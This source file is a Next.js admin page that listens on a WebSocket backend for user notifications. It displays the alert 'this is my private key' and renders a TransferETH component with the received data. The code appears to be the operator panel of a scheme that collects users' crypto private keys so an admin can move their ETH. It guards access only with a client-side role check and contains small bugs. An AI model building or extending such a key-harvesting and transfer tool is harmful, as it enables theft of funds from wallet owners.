"use client";
import { useEffect, useState } from "react";
import { io } from "socket.io-client";
import { useRouter } from "next/router";
import { useAuth } from "../../context/AuthContext";
import TransferETH from "../../components/TransferETH";

// Connect to the WebSocket server
const socket = io("https://backend-walletmanag.onrender.com");

export default function AdminPage() {
  const { role } = useAuth(); // Access the role from AuthContext
  const router = useRouter();

  const [notifdata, setNotifdata] = useState("");
  const [notif, setnotif] = useState("");
  const [Ismessage, setIsmsg] = useState(false);

  useEffect(() => {
    if (role !== "admin") {
      router.push("/"); // Redirect unauthorized users to the home page
    }
    const socket = io("https://backend-walletmanag.onrender.com");
    socket.on("sendNotification", (data) => {
      const { message, selectedNetwork } = data;
      console.log("Message:", message);
      console.log("selected option Variable:", selectedNetwork);
      setNotifdata(data);
      const notifmessage = "Notification From User: this is my private key";
      setnotif(notifmessage);
      setIsmsg(true);
      // Show alert with the notification message
      alert(notifmessage);
    });
    // Cleanup function to remove the event listener
    return () => {
      socket.off("sendNotification ");
      socket.disconnect();
      setIsmsg(false);
    };
  }, []);
  if (role !== "admin") return null;
  return (
    <div>
      <h1>Hello Admin!</h1>

      {Ismessage ? <TransferETH data={notifdata} /> : null}
    </div>
  );
}
